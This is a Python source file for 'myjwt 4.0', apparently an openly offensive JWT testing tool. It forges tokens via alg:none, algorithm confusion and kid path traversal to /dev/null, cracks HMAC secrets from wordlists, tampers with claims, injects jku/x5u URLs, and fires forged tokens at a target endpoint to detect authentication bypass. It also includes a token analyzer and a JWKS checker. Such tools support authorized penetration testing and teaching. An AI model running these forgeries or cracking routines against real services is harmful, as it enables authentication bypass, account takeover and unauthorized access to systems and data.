#!/usr/bin/env python3
"""
myjwt 4.0 - JWT Security Testing Framework
BY HACKITA - OFFENSIVE SECURITY
https://hackita.it/articoli/jwt/

Features:
- Strict Decoding & Analysis (JSON, Base64URL, UTF-8)
- Attack Engine (alg:none, kid injection, confusion, claim tampering, forge)
- Crypto Engine (Optional: requires 'cryptography' for RSA/EC/EdDSA)
- HTTP Testing Engine (Optional: requires 'requests' for active testing)
- JWKS Analyzer

Exit Codes:
 0: Success
 1: Parse / Token Error
 2: Usage / Argument Error
 3: Signature Invalid
 4: Secret Cracked
 5: Vulnerabilities Found (--analyze)
"""
import argparse
import base64
import binascii
import hashlib
import hmac
import json
import os
import re
import sys
import time
import urllib.request
import urllib.error
import ssl
from datetime import datetime, timezone

# --- HACKITA BRANDING COLORS ---
RED    = "\033[38;5;196m"  # Hackita Bright Red
DRED   = "\033[38;5;88m"   # Hackita Dark Red
WHITE  = "\033[38;5;255m"  # Pure White
BLACK  = "\033[38;5;236m"  # Dark Grey
GREEN  = "\033[38;5;46m"   # Green (for success)
YELLOW = "\033[38;5;226m"  # Yellow (for warnings)
DIM    = "\033[2m"         # Dim text
RESET  = "\033[0m"
BOLD   = "\033[1m"

VERSION = "4.0"

# --- OPTIONAL DEPENDENCIES ---
try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa, ec, ed25519, ed448, utils
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

HMAC_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

class JwtError(Exception):
    pass

# --------------------------------------------------------- PARSING & DECODE --
def b64url_decode(segment):
    if not segment:
        return b""
    if not re.match(r"^[A-Za-z0-9_\-]+$", segment):
        raise JwtError(f"Invalid Base64URL characters in segment")
    if len(segment) % 4 == 1:
        raise JwtError("Invalid Base64URL length")
    padded = segment + "=" * (-len(segment) % 4)
    try:
        return base64.urlsafe_b64decode(padded)
    except Exception as e:
        raise JwtError(f"Base64URL decode failed: {e}")

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def strict_json_loads(data):
    try:
        text = data.decode("utf-8")
        if re.search(r'\b(NaN|Infinity)\b', text):
            raise JwtError("Invalid JSON (NaN or Infinity found)")
        duplicates = []
        def hook(pairs):
            d = {}
            for k, v in pairs:
                if k in d: duplicates.append(k)
                d[k] = v
            return d
        return json.loads(text, object_pairs_hook=hook), duplicates
    except json.JSONDecodeError as e:
        raise JwtError(f"Invalid JSON: {e}")

def parse_token(token):
    parts = token.split(".")
    if len(parts) not in (3, 5):
        raise JwtError(f"Expected 3 (JWS) or 5 (JWE) parts, got {len(parts)}")
    
    header_raw = b64url_decode(parts[0])
    header, dup_h = strict_json_loads(header_raw)
    
    if len(parts) == 5:
        # JWE: header . encrypted_key . iv . ciphertext . tag
        return {"raw": token, "parts": parts, "header": header, "type": "JWE", "duplicates": dup_h}
    
    payload_raw = b64url_decode(parts[1])
    payload, dup_p = strict_json_loads(payload_raw)
    sig_raw = b64url_decode(parts[2])
    
    return {
        "raw": token, "parts": parts, "header": header, "payload": payload,
        "signature": sig_raw, "type": "JWS", "duplicates": dup_h + dup_p
    }

def extract_token(raw):
    raw = raw.strip()
    candidates = re.findall(r"[A-Za-z0-9_\-+/]+(?:\.[A-Za-z0-9_\-+/]*){2,4}", raw)
    if not candidates:
        raise JwtError("No JWT found in input")
    return max(candidates, key=len)

# --------------------------------------------------------- CRYPTO ENGINE --
def verify_hmac(info, secret):
    alg = info["header"].get("alg")
    if alg not in HMAC_ALGS: raise JwtError(f"Unsupported HMAC alg: {alg}")
    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
    expected = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
    return hmac.compare_digest(expected, info["signature"])

def verify_asymmetric(info, pub_key_bytes):
    if not HAS_CRYPTO:
        raise JwtError("Missing 'cryptography' library. pip install cryptography")
    alg = info["header"].get("alg")
    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
    
    try:
        public_key = serialization.load_pem_public_key(pub_key_bytes)
    except Exception as e:
        raise JwtError(f"Failed to load public key: {e}")

    try:
        if alg.startswith("RS"):
            hash_alg = hashes.SHA256() if alg == "RS256" else hashes.SHA384() if alg == "RS384" else hashes.SHA512()
            public_key.verify(info["signature"], signing_input, padding.PKCS1v15(), hash_alg)
        elif alg.startswith("PS"):
            hash_alg = hashes.SHA256() if alg == "PS256" else hashes.SHA384() if alg == "PS384" else hashes.SHA512()
            public_key.verify(info["signature"], signing_input, padding.PSS(mgf=padding.MGF1(hash_alg), salt_length=hash_alg.digest_size), hash_alg)
        elif alg.startswith("ES"):
            hash_alg = hashes.SHA256() if alg == "ES256" else hashes.SHA384() if alg == "ES384" else hashes.SHA512()
            key_size = public_key.key_size
            # JOSE format: R || S. Cryptography wants DER.
            num_bytes = (key_size + 7) // 8
            if len(info["signature"]) != 2 * num_bytes:
                raise JwtError("Invalid ECDSA signature length")
            r = int.from_bytes(info["signature"][:num_bytes], 'big')
            s = int.from_bytes(info["signature"][num_bytes:], 'big')
            der_sig = utils.encode_dss_signature(r, s)
            public_key.verify(der_sig, signing_input, ec.ECDSA(hash_alg))
        elif alg in ("EdDSA", "Ed25519", "Ed448"):
            public_key.verify(info["signature"], signing_input)
        else:
            raise JwtError(f"Unsupported asymmetric alg: {alg}")
        return True
    except Exception as e:
        return False

# --------------------------------------------------------- ATTACK ENGINE --
def forge_none(info):
    header = dict(info["header"]); header["alg"] = "none"
    return f"{b64url_encode(json.dumps(header, separators=(',', ':')))}.{info['parts'][1]}."

def forge_confusion(info, pubkey_bytes):
    header = dict(info["header"]); header["alg"] = "HS256"
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    signing_input = f"{header_b64}.{info['parts'][1]}".encode()
    sig = hmac.new(pubkey_bytes, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{info['parts'][1]}.{b64url_encode(sig)}"

def forge_kid(info):
    header = dict(info["header"])
    header["alg"] = "HS256"
    header["kid"] = "../../../../../../dev/null"
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    signing_input = f"{header_b64}.{info['parts'][1]}".encode()
    sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{info['parts'][1]}.{b64url_encode(sig)}"

def forge_claims(info, claims_to_set, secret, jku=None, x5u=None):
    header = dict(info["header"])
    payload = dict(info["payload"])
    
    if jku: header["jku"] = jku
    if x5u: header["x5u"] = x5u
    
    for assignment in claims_to_set:
        k, v_str = assignment.split("=", 1)
        try:
            v = json.loads(v_str) # Handles true, 123, null, array, obj
        except json.JSONDecodeError:
            v = v_str
        payload[k] = v
        
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
    signing_input = f"{header_b64}.{payload_b64}".encode()
    
    alg = header.get("alg", "HS256")
    if alg in HMAC_ALGS:
        sig = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
    else:
        raise JwtError(f"Cannot forge with secret for alg: {alg}")
        
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"

# --------------------------------------------------------- CRACK ENGINE --
def crack_hmac(token, wordlist_path, max_lines=None):
    info = parse_token(token)
    if info["type"] != "JWS": raise JwtError("JWE cannot be cracked this way")
    alg = info["header"].get("alg")
    if alg not in HMAC_ALGS: raise JwtError(f"Not HMAC: {alg}")
    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
    target_sig = info["signature"]

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for i, line in enumerate(f):
                if max_lines and i >= max_lines: break
                word = line.rstrip("\n\r")
                if not word: continue
                secret = word.encode()
                expected = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
                if hmac.compare_digest(expected, target_sig):
                    return word
    except OSError as e:
        raise JwtError(f"Cannot read wordlist: {e}")
    return None

# --------------------------------------------------------- VULN SCANNER --
def analyze(info, now):
    findings = []
    header = info.get("header", {})
    payload = info.get("payload", {})
    alg = header.get("alg")
    
    if not alg:
        findings.append(("HIGH", "Missing 'alg' in header"))
    elif str(alg).lower() == "none":
        findings.append(("CRITICAL", "Algorithm 'none' is used (Unsecured token)"))
    elif alg.upper() in HMAC_ALGS:
        findings.append(("INFO", f"Symmetric HMAC ({alg}) - secret strength is crucial"))
    elif alg.startswith(("RS", "PS", "ES")):
        findings.append(("INFO", f"Asymmetric algorithm ({alg})"))
    
    if "exp" not in payload:
        findings.append(("MEDIUM", "Missing 'exp' (expiration) claim"))
    else:
        exp = payload["exp"]
        if not isinstance(exp, (int, float)):
            findings.append(("HIGH", "'exp' is not a valid NumericDate"))
        elif exp < now:
            findings.append(("INFO", "Token is expired"))
        elif exp - now > 86400:
            findings.append(("LOW", f"Token lifetime is very long ({int((exp-now)/3600)} hours)"))
            
    if "iat" in payload:
        iat = payload["iat"]
        if isinstance(iat, (int, float)) and iat > now + 60:
            findings.append(("MEDIUM", "Token issued in the future ('iat')"))
            
    if "iss" not in payload:
        findings.append(("LOW", "Missing 'iss' (issuer) claim"))
    if "aud" not in payload:
        findings.append(("LOW", "Missing 'aud' (audience) claim"))
        
    if "kid" in header:
        kid = str(header["kid"])
        if "../" in kid or "/" in kid:
            findings.append(("HIGH", "Potential 'kid' path traversal"))
        if "'" in kid or '"' in kid or "union" in kid.lower():
            findings.append(("HIGH", "Potential 'kid' SQL injection"))
            
    if "jku" in header: findings.append(("MEDIUM", f"'jku' present: {header['jku']} (Check SSRF/Trust)"))
    if "x5u" in header: findings.append(("MEDIUM", f"'x5u' present: {header['x5u']} (Check SSRF/Trust)"))
    if "jwk" in header: findings.append(("HIGH", "'jwk' embedded key present"))
    if "x5c" in header: findings.append(("HIGH", "'x5c' embedded cert chain present"))
        
    sensitive_keys = ["password", "secret", "token", "api_key", "email"]
    for k in payload:
        if any(s in k.lower() for s in sensitive_keys):
            findings.append(("INFO", f"Potential sensitive claim: '{k}'"))
            
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda x: sev_order.get(x[0], 5))
    return findings

# --------------------------------------------------------- HTTP ENGINE --
def test_http_endpoint(url, method, headers_str, new_token, original_token=None, insecure=False):
    if not HAS_REQUESTS:
        print(f"{RED}[!] 'requests' library required for HTTP testing. pip install requests{RESET}")
        return
    
    headers = {}
    if headers_str:
        for h in headers_str.split(","):
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    
    headers["Authorization"] = f"Bearer {new_token}"
    
    print(f"\n{DRED}[*] Testing HTTP Endpoint: {method} {url}{RESET}")
    try:
        r_new = requests.request(method, url, headers=headers, timeout=10, verify=not insecure)
        print(f"  {WHITE}Mutated Status: {r_new.status_code} | Length: {len(r_new.text)}{RESET}")
        
        if original_token:
            headers_orig = headers.copy()
            headers_orig["Authorization"] = f"Bearer {original_token}"
            r_orig = requests.request(method, url, headers=headers_orig, timeout=10, verify=not insecure)
            print(f"  {DIM}Baseline Status: {r_orig.status_code} | Length: {len(r_orig.text)}{RESET}")
            
            if r_new.status_code == r_orig.status_code and len(r_new.text) == len(r_orig.text):
                print(f"  {YELLOW}[!] Response identical to baseline. No bypass.{RESET}")
            elif r_new.status_code == 200 and r_orig.status_code != 200:
                print(f"  {GREEN}[+] Different response! Possible bypass.{RESET}")
                print(f"  {DIM}{r_new.text[:200]}...{RESET}")
            else:
                print(f"  {YELLOW}[?] Different response, investigate manually.{RESET}")
    except Exception as e:
        print(f"  {RED}[!] HTTP Error: {e}{RESET}")

# --------------------------------------------------------- JWKS ANALYZER --
def analyze_jwks(url, insecure=False):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    print(f"{DRED}[*] Fetching JWKS from {url}...{RESET}")
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'myjwt/4.0'})
        with urllib.request.urlopen(req, timeout=10, context=ctx) as response:
            jwks = json.loads(response.read().decode())
            
        keys = jwks.get("keys", [])
        print(f"{WHITE}[+] Found {len(keys)} keys.{RESET}")
        for i, k in enumerate(keys):
            print(f"  {RED}Key {i+1}:{RESET} kty={k.get('kty')}, kid={k.get('kid')}, alg={k.get('alg')}")
            if k.get('d'):
                print(f"    {RED}[!] WARNING: Private key material found (parameter 'd')!{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error fetching JWKS: {e}{RESET}")

# --------------------------------------------------------- MAIN & CLI --
def main():
    logo = f"""
{WHITE}{BOLD}██╗  ██╗ █████╗  ██████╗██╗  ██╗{RED}██╗████████╗ █████╗ {RESET}
{WHITE}{BOLD}██║  ██║██╔══██╗██╔════╝██║ ██╔╝{RED}██║╚══██╔══╝██╔══██╗{RESET}
{WHITE}{BOLD}███████║███████║██║     █████╔╝ {RED}██║   ██║   ███████║{RESET}
{WHITE}{BOLD}██╔══██║██╔══██║██║     ██╔═██╗ {RED}██║   ██║   ██╔══██║{RESET}
{WHITE}{BOLD}██║  ██║██║  ██║╚██████╗██║  ██╗{RED}██║   ██║   ██║  ██║{RESET}
{WHITE}{BOLD}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{RED}╚═╝   ╚═╝   ╚═╝  ╚═╝{RESET}
{DRED}  J W T   S E C U R I T Y   T E S T I N G   F R A M E W O R K  {RESET}
"""

    parser = argparse.ArgumentParser(description="myjwt 4.0 - Hackita Framework", formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("token", nargs="?", help="JWT token to analyze")
    parser.add_argument("-f", "--file", help="Read token from file")
    parser.add_argument("--jwks", help="Fetch and analyze a JWKS URL")
    parser.add_argument("--analyze", action="store_true", help="Run vulnerability scanner")
    parser.add_argument("--crack", metavar="WORDLIST", help="Crack HMAC secret")
    parser.add_argument("--max-lines", type=int, help="Limit wordlist lines")
    parser.add_argument("--attack", choices=["none", "confusion", "kid", "forge"], help="Run an attack")
    parser.add_argument("--set", action="append", default=[], help="Claim=value (JSON supported)")
    parser.add_argument("-k", "--secret", help="Secret for HMAC")
    parser.add_argument("-K", "--pubkey", help="Public key file for asymmetric ops")
    parser.add_argument("--url", help="Target URL for HTTP testing")
    parser.add_argument("--method", default="GET", help="HTTP method")
    parser.add_argument("--headers", help="Custom headers (e.g. 'X-Forwarded-For: 127.0.0.1')")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    parser.add_argument("--jku", help="JKU URL to inject")
    parser.add_argument("--x5u", help="X5U URL to inject")

    args = parser.parse_args()

    if not args.token and not args.file and not args.jwks:
        print(logo)
        parser.print_help()
        sys.exit(2)

    print(logo)

    if args.jwks:
        analyze_jwks(args.jwks, insecure=args.insecure)
        sys.exit(0)

    try:
        raw = open(args.file).read() if args.file else args.token
        token = extract_token(raw)
        info = parse_token(token)
    except JwtError as e:
        print(f"{RED}[!] Parse Error: {e}{RESET}")
        sys.exit(1)

    # Output Base
    print(f"{DRED}=================================================={RESET}")
    print(f"{RED}{BOLD}[*] TOKEN TYPE: {info['type']}{RESET}")
    print(f"{RED}{BOLD}[*] HEADER{RESET}")
    print(json.dumps(info["header"], indent=2))
    
    if info["type"] == "JWS":
        print(f"{RED}{BOLD}[*] PAYLOAD{RESET}")
        print(json.dumps(info["payload"], indent=2))
    else:
        print(f"{DIM}[*] JWE Payload is encrypted.{RESET}")

    if info["duplicates"]:
        print(f"{RED}[!] Duplicate keys detected: {info['duplicates']}{RESET}")

    # Analyze
    if args.analyze and info["type"] == "JWS":
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}[*] VULNERABILITY ANALYSIS{RESET}")
        findings = analyze(info, time.time())
        if not findings:
            print(f"  {GREEN}[+] No obvious issues found.{RESET}")
        else:
            for sev, msg in findings:
                color = RED if sev in ("CRITICAL", "HIGH") else YELLOW if sev == "MEDIUM" else WHITE
                print(f"  {color}[{sev}]{RESET} {msg}")
            sys.exit(5)
    
    # Crack
    if args.crack:
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}[*] CRACKING HMAC SECRET{RESET}")
        try:
            secret = crack_hmac(token, args.crack, args.max_lines)
            if secret:
                print(f"{GREEN}[+] Secret found: {secret}{RESET}")
                sys.exit(4)
            else:
                print(f"{YELLOW}[!] No secret found in wordlist.{RESET}")
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
            sys.exit(1)

    # Attacks
    if args.attack and info["type"] == "JWS":
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}[*] ATTACK MODE: {args.attack.upper()}{RESET}")
        
        new_token = None
        try:
            if args.attack == "none":
                new_token = forge_none(info)
            elif args.attack == "kid":
                new_token = forge_kid(info)
            elif args.attack == "confusion":
                if not args.pubkey: raise JwtError("--pubkey required for confusion")
                with open(args.pubkey, "rb") as f: new_token = forge_confusion(info, f.read())
            elif args.attack == "forge":
                if not args.secret: raise JwtError("-k/--secret required for forge")
                new_token = forge_claims(info, args.set, args.secret.encode(), args.jku, args.x5u)
        except Exception as e:
            print(f"{RED}[!] Attack Failed: {e}{RESET}")
            sys.exit(1)

        if new_token:
            print(f"{GREEN}[+] Forged Token:{RESET}\n{new_token}")
            if args.url:
                test_http_endpoint(args.url, args.method, args.headers, new_token, original_token=token, insecure=args.insecure)
    
    # Verification
    elif args.secret or args.pubkey:
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}[*] VERIFICATION{RESET}")
        try:
            if args.secret:
                ok = verify_hmac(info, args.secret.encode())
                print(f"{GREEN if ok else RED}[{'+' if ok else '!'}] HMAC Signature {'VALID' if ok else 'INVALID'}{RESET}")
                if not ok: sys.exit(3)
            elif args.pubkey:
                with open(args.pubkey, "rb") as f:
                    ok = verify_asymmetric(info, f.read())
                print(f"{GREEN if ok else RED}[{'+' if ok else '!'}] Asymmetric Signature {'VALID' if ok else 'INVALID'}{RESET}")
                if not ok: sys.exit(3)
        except Exception as e:
            print(f"{RED}[!] Verification Error: {e}{RESET}")
            sys.exit(1)

    # Footer
    print(f"\n{DRED}=================================================={RESET}")
    print(f"{RED}{BOLD}       READ MORE ON HACKITA{RESET}")
    print(f"{DRED}=================================================={RESET}")
    print(f" {WHITE}🇮🇹 Italian  : {RED}https://hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇬🇧 English  : {RED}https://en.hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇪🇸 Spanish  : {RED}https://es.hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇩🇪 German   : {RED}https://de.hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇵🇹 Portuguese: {RED}https://pt.hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇫🇷 French   : {RED}https://fr.hackita.it/articoli/jwt/{RESET}")
    print(f"{DRED}=================================================={RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted.")
        sys.exit(130)
